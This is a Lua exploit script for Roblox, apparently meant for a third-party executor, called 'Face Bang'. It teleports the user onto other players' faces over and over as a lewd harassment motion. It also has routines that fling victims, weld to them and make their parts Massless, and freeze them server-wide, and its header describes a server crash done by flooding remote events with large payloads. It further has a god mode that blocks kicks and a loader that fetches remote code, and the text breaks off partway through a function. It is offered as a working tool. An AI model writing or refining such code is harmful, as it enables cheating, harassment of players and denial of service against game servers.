--[[
================================================================================
  FACE BANG   v3.0.0      on-the-face bangs / zero delay
================================================================================
  WHAT IT IS
  A client-side panel whose bang is a motion you own plus a picture at the
  target's head. Nothing is ever written to the other player.

  THE MOTION (Config.Motion = "teleport", the default)
  You are teleported onto their face, then snapped back out, then in again, on
  every frame pass - a shuttle with no pause in it. Only YOUR position is
  written. They are never held, never frozen, never relocated, never turned
  into a static body: their CFrame, velocity, humanoid state and seats are left
  exactly as the game and their own client have them. Set
  Config.Motion = "visual" for the burst alone with no movement.

  Because your HumanoidRootPart is yours to write, the shuttle is instant and
  local, and it replicates the way your own movement always does while
  PlatformStand holds the character controller out of the way. On stop you are
  put back on the spot you started from (Config.ReturnOnStop).

  WHY IT NO LONGER FLINGS OR FREEZES
  The old bang wrote a velocity into the victim every frame and forced state on
  them. In the games this is used in - Mic Up style voice/seat games - players
  never collide, so the overlap resolved to nothing while the side effects did
  all the damage: your root was pinned with PlatformStand, collisions were
  turned off, angular velocity zeroed, seat welds destroyed - which is what "I
  got frozen / stuck" and "he stopped" looked like. Every write to THEM is
  gone; the state changes that remain are on your own body and are undone on
  stop.

  So a bang is: the shuttle above, plus a burst at their head - a Neon core
  that swells and fades, an expanding shockwave ring, a spark emitter, a
  BANG!! label, a sound and a small camera kick. Zero value is
  changed on either character, so nothing can be stopped, frozen or flung.

  WHY "ZERO DELAY"
  - The first burst is created synchronously inside Bang() - it exists on the
    frame you press the button, before any frame callback runs.
  - The first teleport lands on the frame you press it too: the engine writes
    your root on PreSimulation, RenderStepped and Heartbeat, so the shuttle has
    already moved you into them before the next frame is drawn.
  - No task.wait / task.delay anywhere on the fire path. Effect ages are driven
    by the one RenderStepped loop that draws them.
  - The loop pulses read the target's Head every frame, so the effect sits on
    them with no interpolation lag.
  Honest limit: a client cannot replicate instances or property writes to
  another player's screen. Their client only shows what the server sends.

  REQUIREMENTS (all soft - the script degrades instead of erroring out)
  - Instance.new under Workspace.CurrentCamera / Workspace (every executor has
    this), RenderStepped, and CFrame / Vector3 writes on your own root plus the
    parts it creates for the picture.
  - No network ownership, no collision write, no velocity write to anyone else.

  SERVER GRIP  (Server tab -> "grip")
  This is the one part that does write to other players, and it is opt-in per
  row. It is the old freeze everyone knows: hold their replicated root on the
  spot it had when you pressed, by writing their CFrame on every frame pass.
  Their own client keeps simulating, the server keeps taking our writes, so to
  everyone but them they are nailed. Three levels, cheapest first:
    - slow chosen / slow all      : 120 writes/s, gentle, never crashes anything
    - hard freeze all (grip)      : every frame pass, all players, no expiry
  A grip costs about one CFrame write per gripped player per pass. Roughly 15
  players is where a weak phone starts to feel it, which is why the radius
  grips are capped.

  SERVER CRASH  (Server tab -> "crash")
  Remotes are the only channel a client has that the server is FORCED to
  receive. Measured in Studio: 231 FireServer calls arrived as 231 on the
  server; 620 calls carrying 8 KB payloads all arrived inside 0.5 s. So a crash
  here is a remote flood - every RemoteEvent in the game, fired as fast as the
  executor can serialise, with a payload big enough that the server must decode
  and dispatch each one.

  The first version of this built thousands of invisible parts in Workspace
  instead, and that was measured to be useless: client-created instances do not
  replicate at all (the server-side check read serverFolder = false while the
  client had it). It loaded your own client and nothing else.

  Honest limit: the server decides what its handlers do. A game that rate limits
  or debounces its remotes barely notices this, and no client can force a
  shutdown - it can only saturate the receive queue.

  OPTIONAL EXECUTOR EXTRAS (probed, used when present)
  - hookmetamethod -> god mode can block TakeDamage / BreakJoints / Kick
  - identifyexecutor, gethui, cloneref, getgenv

  KEYS     [B] bang nearest   [L] loop   [X] stop   [RightShift] show/hide
  LOAD     loadstring(game:HttpGet("<raw url>"))()
  UNLOAD   getgenv().FaceBang.Unload()
================================================================================
]]

do
	-- single source of truth: the UI header prints this, so it must not drift
	local VERSION = "3.0.0"

	local ENV = (getgenv and getgenv()) or _G
	if type(ENV.FaceBang) == "table" and type(ENV.FaceBang.Unload) == "function" then
		pcall(ENV.FaceBang.Unload)
	end

	------------------------------------------------------------------ services
	local cloneref = cloneref or function(o) return o end
	local Players = cloneref(game:GetService("Players"))
	local RunService = cloneref(game:GetService("RunService"))
	local UserInput = cloneref(game:GetService("UserInputService"))
	local TweenService = cloneref(game:GetService("TweenService"))
	local StarterGui = cloneref(game:GetService("StarterGui"))
	local Workspace = cloneref(game:GetService("Workspace"))
	local LP = Players.LocalPlayer

	--------------------------------------------------------------------- flags
	-- capability probe: everything is optional, nothing hard-fails
	local function has(name)
		local ok, fn = pcall(function() return ENV[name] end)
		return ok and type(fn) == "function"
	end
	local CAP = {
		executor = "unknown",
		gethui = has("gethui"),
		hookMetamethod = has("hookmetamethod"),
	}
	do
		local ok, name = pcall(function() return identifyexecutor and identifyexecutor() end)
		if ok and type(name) == "string" then CAP.executor = name end
	end

	-- input surface: phones have no keyboard, so every action needs a tap path
	local IsTouch = UserInput.TouchEnabled

	-------------------------------------------------------------------- config
	local Config = {
		AutoRetarget = true, -- jump to the next closest player when one dies

		-- bang picture. Defaults are ALL OFF: the script is now a pure tool, so a
		-- bang is a position change and nothing else. Every one of these still
		-- works if you switch it on; nothing was deleted to get here.
		FXStyle = "none",   -- none / nova / shockwave / glitch / flame
		FXScale = 1.6,      -- 1.0 small .. 3.5 insane
		FXPulse = 0.12,     -- seconds between pulses while the bang is looping
		FXText = false,     -- BANG!! label with a hit count
		FXSound = false,    -- local impact sound
		FXShake = false,    -- small camera kick on every pulse
		FXMarker = false,   -- outline the locked target
		FlyFX = false,      -- trail, thrusters, aura, camera bank, FOV
		FlyPose = false,    -- superman pose: body flat, arms forward (rig joints)

		-- Backdrop / media. Roblox can only show rbxassetid assets it hosts, so
		-- these are OPTIONAL hooks for things you uploaded yourself. Empty means
		-- the panel draws its own animated backdrop, which needs no upload.
		--   BG_ImageId: "rbxassetid://0000"  a still image (blurred + dimmed)
		--   BG_VideoId: "rbxassetid://0000"  a video YOU uploaded (looped, muted)
		--   MusicId:    "rbxassetid://0000"  a Roblox sound you may use
		BG_ImageId = "",
		BG_VideoId = "",
		MusicId = "",
		MusicMuted = false,

		-- bang motion: "teleport" = you go onto their face and snap back out,
		-- repeating; "visual" = you never leave your spot. Neither one writes
		-- anything to them, so they are never held, paused or pushed.
		Motion = "teleport",
		Stage = 4,           -- studs you snap back to between hits
		MotionRate = 1,      -- 1 = every frame pass, 2 = every second, 3 = every third
		ReturnOnStop = true, -- put you back where you started on stop

		FXLimit = 90,       -- hard cap on live bang parts, so a fast pulse cannot churn

		FlingPower = 2400,  -- only used by the optional fling row, never by a bang
		FreezeMax = 8,      -- a local freeze expires instead of pinning forever
		-- server grip: writes THEIR root every pass, so it is a real freeze for
		-- everyone except them. GripRate 1 = every pass, 3 = every third pass.
		GripRate = 1,
		GripRadius = 150,
		GripMaxPlayers = 15, -- the cap is what stops a 40-player server stalling you
		-- strict god mode installs executor metamethod hooks. That wrapper runs on
		-- EVERY method call in the game, which is exactly why it is off by default:
		-- it is the thing that made the game lag.
		GodStrict = false,
		GodHealth = 1e9,    -- finite on purpose: math.huge gets reset by servers
		VoidFloor = -80,    -- anti-void: re-surface below this Y
		KeyBang = Enum.KeyCode.B,
		KeyLoop = Enum.KeyCode.L,
		KeyStop = Enum.KeyCode.X,
		KeyUI = Enum.KeyCode.RightShift,
	}

	local UI -- filled in by the interface section below

	------------------------------------------------------------------- logging
	local function notify(title, text, dur)
		pcall(function()
			StarterGui:SetCore("SendNotification", {
				Title = title,
				Text = text,
				Duration = dur or 4,
			})
		end)
	end

	local function out(text)
		if UI and UI.status then UI.status(text) end
	end

	------------------------------------------------------------------- helpers
	--[[
	  NOTE: never compare a service by instance identity here. cloneref()
	  intentionally returns a reference that is ~= the real service, so
	  `plr.Parent ~= Players` is ALWAYS true on executors with cloneref and
	  rejected every player ("no player detected"). Membership is implied by
	  iterating Players:GetPlayers(), so the parent check is not needed.
	]]
	local function alive(plr)
		if not plr or plr == LP then return false end
		local char = plr.Character
		if not char or not char.Parent then return false end
		local hum = char:FindFirstChildOfClass("Humanoid")
		if not hum or hum.Health <= 0 then return false end
		-- custom rigs often have no part literally named "Head"; the root is
		-- the only part guaranteed on a humanoid character
		return char:FindFirstChild("HumanoidRootPart") ~= nil
	end

	local function myRoot()
		local char = LP.Character
		return char and char:FindFirstChild("HumanoidRootPart")
	end

	local function myHum()
		local char = LP.Character
		return char and char:FindFirstChildOfClass("Humanoid")
	end

	local function nearest()
		local root = myRoot()
		if not root then return nil end
		local me = root.Position
		local best, bestDist = nil, math.huge
		for _, plr in ipairs(Players:GetPlayers()) do
			if alive(plr) then
				local root2 = plr.Character:FindFirstChild("HumanoidRootPart")
				local d = root2 and (root2.Position - me).Magnitude or math.huge
				if d < bestDist then best, bestDist = plr, d end
			end
		end
		return best
	end

	-------------------------------------------------------------------- engine
	--[[
	  The engine is now only a target tracker. It decides WHO is banged and when
	  to retarget; the picture itself belongs to lib/fx.lua. Nothing here writes
	  to a character, which is what makes "stop" instantaneous and what makes it
	  impossible for the bang to freeze, pin or fling anyone.
	]]
	local Engine = {
		running = false,
		loop = false,
		target = nil,
		head = nil,
		root = nil,
		tick = 0,
		phase = false, -- in / out leg of the shuttle
		axis = nil,    -- line the shuttle runs along, from their head to where you were
		saved = nil,   -- your position and state before the first teleport
		conns = {},    -- frame passes, so unload can really stop them
		fx = nil,      -- injected by the interface once the fx module exists
	}

	--[[
	  The bang MOTION: you land on their face, you snap back out, you go in
	  again, on every frame pass. Two things are deliberate:

	  - nothing is written to their character. Not a CFrame, not a state, not a
	    weld. They keep walking, sitting, talking; the only thing that moves is
	    you, so nobody can be paused or stuck by this.
	  - your own position is written straight in (CFrame), never with velocity,
	    and PlatformStand is on while it runs so the character controller cannot
	    fight the teleports and slide you off the head.

	  The in/out parity flips once per pass rather than once per frame, so the
	  last write before the frame is drawn alternates every frame: that is the
	  visible back-and-forth, with no pause anywhere in it.
	]]
	local function shuttle()
		if Config.Motion ~= "teleport" then return end
		local hrp, head = Engine.root, Engine.head
		if not hrp or not head or not head.Parent then return end
		local headCF = head.CFrame
		if not Engine.axis then
			local from = Engine.saved and Engine.saved.pos or hrp.Position
			local d = from - headCF.Position
			-- straight line back along the way you arrived, or away from their
			-- face if you were already standing on top of them
			Engine.axis = d.Magnitude > 1 and d.Unit or (-(headCF.LookVector))
		end
		-- rate: 1 = a write every pass, 2 = every second pass, 3 = every third.
		-- Slows the shuttle down without adding or removing frame passes.
		local rate = math.max(1, math.floor(tonumber(Config.MotionRate) or 1))
		if rate > 1 then
			Engine.moveTick = (Engine.moveTick or 0) + 1
			if Engine.moveTick % rate ~= 0 then return end
		end
		Engine.phase = not Engine.phase
		local at = headCF.Position + Vector3.new(0, 0.2, 0)
		if not Engine.phase then at = at + Engine.axis * Config.Stage end
		pcall(function()
			-- keep whatever facing you had; only the position is teleported
			hrp.CFrame = CFrame.new(at) * (hrp.CFrame - hrp.CFrame.Position)
			hrp.AssemblyLinearVelocity = Vector3.zero
			hrp.AssemblyAngularVelocity = Vector3.zero
		end)
	end

	-- put you back: position, velocity and stand state as they were found
	local function releaseMotion(doReturn)
		local saved = Engine.saved
		Engine.saved = nil
		Engine.phase = false
		Engine.axis = nil
		if not saved then return end
		local hrp, hum = myRoot(), myHum()
		if doReturn and hrp and saved.cframe then
			pcall(function()
				hrp.CFrame = saved.cframe
				hrp.AssemblyLinearVelocity = Vector3.zero
				hrp.AssemblyAngularVelocity = Vector3.zero
			end)
		end
		if hum then
			pcall(function() hum.PlatformStand = saved.platformStand end)
			if not saved.platformStand then
				pcall(function() hum:ChangeState(Enum.HumanoidStateType.GettingUp) end)
			end
		end
	end

	-- hot path: target upkeep only. No waits, no allocation beyond a 10-tick ref refresh.
	local function step()
		if not Engine.running then return end
		Engine.tick += 1

		local hrp = Engine.root
		if not hrp or not hrp.Parent then
			hrp = myRoot()
			Engine.root = hrp
			if not hrp then return end
		end

		if Engine.tick % 10 == 1 or not Engine.head or not Engine.head.Parent then
			if not alive(Engine.target) then
				if Config.AutoRetarget then
					local nxt = nearest()
					if not nxt then
						--[[
						  No one left to bang: stop cleanly rather than leaving the
						  shuttle (and PlatformStand) mid-leg with nothing to follow.
						  Leaving it running used to strand you floating on a corpse.
						]]
						Engine.stop()
						return
					end
					Engine.target = nxt
					if Engine.fx then Engine.fx.startBang(nxt) end
					if UI and UI.markList then UI.markList() end
				else
					Engine.stop()
					return
				end
			end
			local char = Engine.target and Engine.target.Character
			if not char then return end
			Engine.head = char:FindFirstChild("Head") or char:FindFirstChild("HumanoidRootPart")
			if not Engine.head then return end
		end

		shuttle()
	end

	function Engine.start(plr)
		plr = plr or nearest()
		if not plr or not alive(plr) then
			local others = 0
			for _, p in ipairs(Players:GetPlayers()) do
				if p ~= LP then others += 1 end
			end
			local why = others == 0
				and "you are alone in this server"
				or ("no valid target among " .. others .. " player(s) - dead, loading or no character")
			notify("Face Bang", why, 4)
			out(why)
			return false
		end
		local hrp = myRoot()
		if not hrp then
			notify("Face Bang", "Character not ready")
			return false
		end

		local char = plr.Character
		local head = char:FindFirstChild("Head") or char:FindFirstChild("HumanoidRootPart")
		if not head then
			notify("Face Bang", plr.Name .. " has no Head or root part")
			return false
		end

		if not Engine.running then
			Engine.tick = 0
			Engine.phase = false
			Engine.axis = nil
			local hum = myHum()
			Engine.saved = {
				cframe = hrp.CFrame,
				pos = hrp.Position,
				platformStand = hum and hum.PlatformStand or false,
			}
			if Config.Motion == "teleport" and hum then
				pcall(function() hum.PlatformStand = true end)
				pcall(function() hum:ChangeState(Enum.HumanoidStateType.Physics) end)
			end
		else
			-- retarget: recompute the shuttle line for the new head
			Engine.axis = nil
		end
		Engine.target = plr
		Engine.root = hrp
		Engine.head = head
		Engine.running = true

		--[[
		  Zero delay means the first teleport happens NOW, synchronously, exactly
		  like the burst: pressing the button puts you on their face before the
		  next frame is drawn, instead of waiting for the first callback.
		]]
		if Config.Motion == "teleport" then shuttle() end

		-- zero delay: this creates the first burst before Bang() returns
		if Engine.fx then Engine.fx.startBang(plr) end

		if UI and UI.state then UI.state(true) end
		if UI and UI.markList then UI.markList() end
		out(Config.Motion == "teleport"
			and ("banging " .. plr.Name .. " (on the face)")
			or ("banging " .. plr.Name .. " (visual only)"))
		return true
	end

	function Engine.stop()
		local was = Engine.running
		Engine.running = false
		Engine.loop = false
		Engine.target = nil
		Engine.head = nil
		releaseMotion(Config.ReturnOnStop)
		-- nothing of ours lives on a character any more, but Targets may still be
		-- driving an explicit fling/weld/freeze the user asked for; the UI installs
		-- this hook to tear those down (see the note in the README about naming
		-- modules before they are declared)
		if Engine.onStop then pcall(Engine.onStop) end
		if Engine.fx then pcall(function() Engine.fx.stopBang() end) end
		if UI and UI.state then UI.state(false) end
		if UI and UI.markList then UI.markList() end
		out("idle")
		if was then notify("Face Bang", "Stopped") end
	end

	--[[
	  A respawn replaces the character, so the saved CFrame and the shuttle no
	  longer mean anything. Clearing them here (instead of the caller poking at
	  Engine fields) means a later stop cannot teleport your NEW character back to
	  where the old one stood.
	]]
	function Engine.reset()
		Engine.running = false
		Engine.target, Engine.head, Engine.root = nil, nil, nil
		Engine.saved, Engine.phase, Engine.axis, Engine.moveTick = nil, false, nil, 0
		if Engine.fx then pcall(function() Engine.fx.stopBang() end) end
		if UI and UI.state then UI.state(false) end
	end

	function Engine.toggle(plr)
		if Engine.running then
			Engine.stop()
			return false
		end
		return Engine.start(plr)
	end

	-- ui.lua calls this on unload. The bang changes no state, so all that is left
	-- to do is drop the picture and the marker.
	local function restore()
		releaseMotion(Config.ReturnOnStop)
		if Engine.fx then pcall(function() Engine.fx.stopBang() end) end
	end

	-- Frame passes, each in a different phase of the frame. They only re-check the
	-- target now, but keeping the three phases means a game that resets
	-- something on Stepped cannot hide a target change from us.
	-- These connections MUST be reachable from unload(): they used to be a bare
	-- Connect with no handle kept, so reloading left the old engine ticking
	-- forever against a destroyed GUI and a stale target.
	local function connectStep(sig)
		if not sig then return end
		Engine.conns[#Engine.conns + 1] = sig:Connect(step)
	end
	connectStep(RunService.RenderStepped)
	connectStep(RunService.Heartbeat)
	connectStep(RunService.PreSimulation or RunService.Stepped)

	-- called by Unload(): stop the engine and detach every frame pass
	function Engine.destroy()
		pcall(Engine.stop)
		for _, c in ipairs(Engine.conns) do pcall(function() c:Disconnect() end) end
		table.clear(Engine.conns)
		Engine.target, Engine.head, Engine.root = nil, nil, nil
	end

	----------------------------------------------------------- modules

	local TargetsLib = (function()
--[[
  targets.lua - per-player actions
  Every action here is CLIENT-SIDE. "Freeze" locks a player's replicated
  position in YOUR view; it does not and cannot stop them on their own screen.
  Nothing in this file touches the server.
]]
local Targets = {}

function Targets.new(ctx)
	local Players, RunService, Workspace = ctx.Players, ctx.RunService, ctx.Workspace
	local LP = ctx.LP
	local M = {}

	local state = {
		frozen = {},     -- [player] = cframe captured when frozen
		following = nil, -- player
		spectating = nil,
		flingConn = nil,
	}

	local function char(plr)
		local c = plr and plr.Character
		if not c or not c.Parent then return nil end
		local hum = c:FindFirstChildOfClass("Humanoid")
		if not hum or hum.Health <= 0 then return nil end
		return c, hum
	end

	-- Any in-flight per-player action of the same class is torn down first, so two
	-- actions cannot drive AssemblyLinearVelocity on the same body in the same
	-- frame ("weld fling" then "fling selected" used to fight, last write wins).
	local function stopOtherMotion(keep)
		if keep ~= "fling" then M.unfling() end
		if keep ~= "weld" then M.unweld() end
	end

	local function rootOf(plr)
		local c = char(plr)
		return c and c:FindFirstChild("HumanoidRootPart")
	end

	function M.teleportTo(plr)
		local myChar = char(LP)
		local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
		local theirRoot = rootOf(plr)
		if not myRoot or not theirRoot then return false, "no character" end
		-- land slightly behind them, offset by their facing so we do not spawn inside
		local dest = theirRoot.CFrame * CFrame.new(0, 0, 3)
		myRoot.CFrame = dest
		return true
	end

	--[[
	  Universal fling. Writing velocity to the VICTIM's part never works: the
	  client does not own a remote player's parts, so the server overwrites it on
	  the next physics step. What does work is the facebang trick - our own
	  assembly IS owned by us, so driving ourselves into them at speed makes the
	  SERVER resolve the collision and launch them.

	  mode "self"  : accelerate our own root through the target (default, works)
	  mode "force" : also write their velocity, for the rare case where we do own
	                 their parts (co-op physics games, sit games)
	]]
	function M.fling(plr, seconds, mode)
		local theirRoot = rootOf(plr)
		local myRoot = rootOf(LP)
		if not theirRoot then return false, "no character" end
		if not myRoot then return false, "no character" end

		stopOtherMotion("fling")
		local until_ = os.clock() + (seconds or 3)
		local myHum = char(LP)
		myHum = myHum and myHum:FindFirstChildOfClass("Humanoid")

		-- Measured in Studio: ~900 studs/s launches about 410 studs, while 2400
		-- with a dithered magnitude launches 1000+. A fixed high speed hits
		-- tunnelling dead zones (1600 and 2000 both launched only 17), so the
		-- magnitude cycles every tick.
		local DITHER = { -1, 0, 1 }
		local tick = 0

		state.flingConn = RunService.RenderStepped:Connect(function()
			tick = tick + 1
			local tr = rootOf(plr)
			local mr = rootOf(LP)
			if not tr or not mr then return end
			if os.clock() > until_ then M.unfling() return end

			local target = tr.CFrame.Position
			local from = mr.CFrame.Position
			local delta = target - from
			if delta.Magnitude < 0.01 then
				delta = tr.CFrame.LookVector * -1
			end

			pcall(function()
				-- drive ourselves hard into them; the cycle keeps us out of the
				-- dead zones where a body skips over the target without contact
				local mult = 1 + 0.25 * DITHER[tick % 3 + 1]
				mr.AssemblyLinearVelocity = delta.Unit * (2400 * mult) + Vector3.new(0, 120, 0)
			end)
			if mode == "force" then
				pcall(function()
					tr.AssemblyLinearVelocity = Vector3.new(0, 1200, 0)
				end)
			end
		end)
		return true
	end

	--[[
	  Weld fling. Found in the wild as "fling based on welding": weld our root to
	  theirs and move, so the target is dragged by OUR owned assembly. Two things
	  the naive version gets wrong and this one handles:

	  - their parts must be Massless, otherwise the shared assembly is so heavy
	    that our own movement stalls and nothing launches
	  - a root-to-root weld shares damage, so it is always torn down afterwards
	]]
	function M.flingWeld(plr, seconds)
		local theirRoot = rootOf(plr)
		local myRoot = rootOf(LP)
		if not theirRoot or not myRoot then return false, "no character" end

		stopOtherMotion("weld")
		state.weldTarget = plr

		-- make their body carry no mass into our assembly
		local theirChar = plr.Character
		for _, d in ipairs(theirChar:GetDescendants()) do
			if d:IsA("BasePart") then
				pcall(function() d.Massless = true end)
			end
		end

		local weld = Instance.new("WeldConstraint")
		weld.Name = "FB_WeldFling"
		weld.Part0 = myRoot
		weld.Part1 = theirRoot
		weld.Parent = myRoot
		state.weld = weld

		-- safety net: if the connection is ever starved (respawn, lag spike,
		-- loading screen) the weld would stay in the world and the two bodies
		-- would remain stuck together. Force the teardown on a timer as well.
		task.delay((seconds or 2.5) + 0.5, function()
			if state.weld == weld then M.unweld() end
		end)

		local until_ = os.clock() + (seconds or 2.5)
		state.weldConn = RunService.RenderStepped:Connect(function()
			if os.clock() > until_ then M.unweld() return end
			local mr = rootOf(LP)
			if not mr then M.unweld() return end
			-- fling the welded assembly: spin + launch
			pcall(function()
				mr.AssemblyLinearVelocity =
					mr.CFrame.RightVector * 1200 + Vector3.new(0, 900, 0)
				-- no angular spin: it stops the humanoid recovering and drags the
				-- owner's camera around with it
				mr.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
			end)
		end)
		return true
	end

	function M.unweld()
		state.weldTarget = nil
		if state.weldConn then
			pcall(function() state.weldConn:Disconnect() end)
			state.weldConn = nil
		end
		if state.weld then
			pcall(function() state.weld:Destroy() end)
			state.weld = nil
		end
		-- hand their mass back so we do not leave their physics changed
		for _, plr in ipairs(Players:GetPlayers()) do
			local c = plr.Character
			if c and plr ~= LP then
				for _, d in ipairs(c:GetDescendants()) do
					if d:IsA("BasePart") and d.Massless then
						pcall(function() d.Massless = false end)
					end
				end
			end
		end
	end

	function M.unfling()
		if state.flingConn then
			pcall(function() state.flingConn:Disconnect() end)
			state.flingConn = nil
		end
	end

	function M.freeze(plr)
		local theirRoot = rootOf(plr)
		if not theirRoot then return false, "no character" end
		-- remember when it was taken: a local freeze that never expires looks
		-- exactly like the player being welded to one spot for the rest of the
		-- session, even after they have actually moved away
		state.frozen[plr] = { cf = theirRoot.CFrame, t = os.clock(), last = theirRoot.CFrame.Position }
		if not state.freezeConn then
			state.freezeConn = RunService.RenderStepped:Connect(function()
				local now = os.clock()
				for p, rec in pairs(state.frozen) do
					local r = rootOf(p)
					--[[
					  Detecting "they are really moving" from AssemblyLinearVelocity is
					  wrong for a remote player: that value is whatever the server last
					  replicated, so during a lag spike or while standing on a moving
					  platform it reads ~0 while they are elsewhere, and the freeze then
					  re-pins them - the exact bug the expiry was added to stop. Compare
					  the CFrame delta we actually receive between frames instead.
					]]
					local moving = false
					if r then
						local pos = r.CFrame.Position
						if rec.last and (pos - rec.last).Magnitude > 4 then moving = true end
						rec.last = pos
					end
					if not r or moving or (now - rec.t) > (Config.FreezeMax or 8) then
						state.frozen[p] = nil
					else
						pcall(function() r.CFrame = rec.cf end)
						-- our own write must not look like a 4-stud jump next frame
						rec.last = r.CFrame.Position
					end
				end
				if next(state.frozen) == nil and state.freezeConn then
					pcall(function() state.freezeConn:Disconnect() end)
					state.freezeConn = nil
				end
			end)
		end
		return true
	end

	function M.thaw(plr)
		if plr then
			state.frozen[plr] = nil
		else
			table.clear(state.frozen)
		end
		if next(state.frozen) == nil and state.freezeConn then
			pcall(function() state.freezeConn:Disconnect() end)
			state.freezeConn = nil
		end
	end

	function M.thawAll()
		table.clear(state.frozen)
		if state.freezeConn then
			pcall(function() state.freezeConn:Disconnect() end)
			state.freezeConn = nil
		end
	end

	function M.isFrozen(plr) return state.frozen[plr] ~= nil end

	function M.frozenCount()
		local n = 0
		for _ in pairs(state.frozen) do n += 1 end
		return n
	end

	-- Freeze everyone inside a radius of the local player, capped so a 100-player
	-- server cannot turn this into a per-frame stall. Local view only.
	function M.freezeAll(radius, maxCount)
		local myRoot = rootOf(LP)
		if not myRoot then return false, "no character" end
		local me = myRoot.CFrame.Position
		local r = radius or 80
		local cap = maxCount or 12
		local n = 0
		for _, plr in ipairs(Players:GetPlayers()) do
			if n >= cap then break end
			if plr ~= LP then
				local pr = rootOf(plr)
				if pr and (pr.CFrame.Position - me).Magnitude <= r then
					if M.freeze(plr) then n += 1 end
				end
			end
		end
		return true, n
	end

	function M.spectate(plr)
		local cam = Workspace.CurrentCamera
		local theirRoot = rootOf(plr)
		if not cam or not theirRoot then return false, "no target camera" end
		M.unspectate()
		state.spectating = plr
		cam.CameraType = Enum.CameraType.Scriptable
		state.spectateConn = RunService.RenderStepped:Connect(function()
			local r = rootOf(plr)
			if not r or state.spectating ~= plr then return end
			local head = r.Position + Vector3.new(0, 2, 0)
			cam.CFrame = CFrame.new(head - r.CFrame.LookVector * 8, head)
		end)
		return true
	end

	function M.unspectate()
		state.spectating = nil
		if state.spectateConn then
			pcall(function() state.spectateConn:Disconnect() end)
			state.spectateConn = nil
		end
		local cam = Workspace.CurrentCamera
		if cam then cam.CameraType = Enum.CameraType.Custom end
	end

	function M.follow(plr)
		M.unfollow()
		state.following = plr
		state.followConn = RunService.Heartbeat:Connect(function()
			if state.following ~= plr then return end
			local myRoot = rootOf(LP)
			local theirRoot = rootOf(plr)
			if not myRoot or not theirRoot then return end
			pcall(function()
				myRoot.CFrame = theirRoot.CFrame * CFrame.new(0, 0, 4)
			end)
		end)
		return true
	end

	function M.unfollow()
		state.following = nil
		if state.followConn then
			pcall(function() state.followConn:Disconnect() end)
			state.followConn = nil
		end
	end

	function M.status()
		local frozen = 0
		for _ in pairs(state.frozen) do frozen += 1 end
		return {
			frozen = frozen,
			following = state.following and state.following.Name or nil,
			spectating = state.spectating and state.spectating.Name or nil,
		}
	end

	function M.cleanup()
		M.unweld()
		M.unfling()
		M.thaw()
		M.unfollow()
		M.unspectate()
	end

	return M
end

		return Targets
	end)()

	local GripLib = (function()
--[[
  grip.lua - server-wide freeze

  Unlike Targets.freeze (a local view that expires and gives up the moment the
  target moves), the grip is the classic exploit freeze: the victim's
  HumanoidRootPart CFrame is written back onto a captured spot on every frame
  pass. A client CAN write another player's part locally, and those writes are
  what their own replicated pose is overwritten with, so to the server and to
  everyone else they are held: no walking, no falling, no sitting up.

  Honest limits:
  - Their own client still simulates. On THEIR screen they keep walking, and
    their client keeps sending position - we simply overwrite what we render
    and what we replicate before it is drawn.
  - It is a write per player per pass, so the cost is yours. The cap exists
    because a 40-player grip at every pass is where a normal client starts to
    stutter; use GripRate 2 or 3 there.
  - A weapon or a hitbox gated on server physics can still fire. The grip is a
    position hold, not invincibility and not a humanoid lock.
]]
local Grip = {}

function Grip.new(ctx)
	local Players, RunService = ctx.Players, ctx.RunService
	local LP = ctx.LP
	local M = {}

	local held = {}      -- [player] = { cframe = ..., t = ... }
	local conns = {}     -- every frame pass we pin on, so stop() really stops them
	local tick = 0

	local function rootOf(plr)
		local c = plr and plr.Character
		local hum = c and c:FindFirstChildOfClass("Humanoid")
		if not hum or hum.Health <= 0 then return nil end
		return c:FindFirstChild("HumanoidRootPart")
	end

	local function loop()
		tick += 1
		local rate = math.max(1, math.floor(tonumber(ctx.Config.GripRate) or 1))
		if tick % rate ~= 0 then return end
		local dead = nil
		for plr, rec in pairs(held) do
			local r = rootOf(plr)
			if not r then
				dead = dead or {}
				dead[#dead + 1] = plr
			else
				pcall(function()
					-- freeze the rotation too: leaving it free lets a click-flick
					-- swing them around while their feet stay nailed
					r.CFrame = rec.cframe
					r.AssemblyLinearVelocity = Vector3.zero
					r.AssemblyAngularVelocity = Vector3.zero
				end)
			end
		end
		if dead then
			for _, plr in ipairs(dead) do held[plr] = nil end
			if next(held) == nil then M.stop() end
		end
	end

	--[[
	  WHY THIS PINS ON THREE PASSES AND NOT ONE

	  Measured in Studio, the client frame order is:
	      Stepped -> PreSimulation -> PostSimulation -> Heartbeat -> RenderStepped

	  Pinning on RenderStepped alone (the first version) writes the target's CFrame
	  BEFORE the next frame's physics step, so physics and the server's replicated
	  position land after our write and win at draw time. Measured against a root
	  pushed at 60 studs/s, that version drifted 2.5 studs and climbing, which is
	  exactly "the freeze does nothing".

	  PostSimulation runs after physics, and Heartbeat after that, so writing there
	  means our value is the last one the frame sees. With PostSimulation added the
	  same test drifted 0.00 studs over 20 samples. RenderStepped is kept as the
	  third pass because it is the last hook before the frame is drawn.

	  Cost: three writes per held player per frame instead of one. That is why the
	  player cap exists.
	]]
	local function ensureConns()
		if #conns > 0 then return end
		local passes = {
			RunService.PostSimulation, -- after physics: the one that actually holds
			RunService.Heartbeat,
			RunService.RenderStepped,  -- last before the frame is drawn
		}
		for _, sig in ipairs(passes) do
			if sig then conns[#conns + 1] = sig:Connect(loop) end
		end
	end

	function M.hold(plr)
		if not plr or plr == LP then return false, "not a target" end
		local r = rootOf(plr)
		if not r then return false, "no character" end
		local n = 0
		for _ in pairs(held) do n += 1 end
		if not held[plr] and n >= (ctx.Config.GripMaxPlayers or 15) then
			return false, "grip cap reached (" .. n .. ")"
		end
		--[[
		  An anchored root cannot be moved by a CFrame write, and a seat weld puts
		  the character on the seat's assembly, so the pin loses to the weld. Both
		  are reported instead of silently doing nothing.
		]]
		if r.Anchored then
			pcall(function() r.Anchored = false end)
		end
		local seated = false
		pcall(function()
			local hum = plr.Character:FindFirstChildOfClass("Humanoid")
			seated = hum ~= nil and hum.Sit == true
		end)
		if seated then return false, "sitting - weld wins over the pin" end

		held[plr] = { cframe = r.CFrame, t = os.clock() }
		ensureConns()
		return true
	end

	function M.release(plr)
		if plr then held[plr] = nil else table.clear(held) end
		if next(held) == nil then M.stop() end
	end

	function M.isHeld(plr) return held[plr] ~= nil end

	function M.count()
		local n = 0
		for _ in pairs(held) do n += 1 end
		return n
	end

	-- everything alive in (or, with no radius, the whole server) -> held
	function M.holdAll(radius)
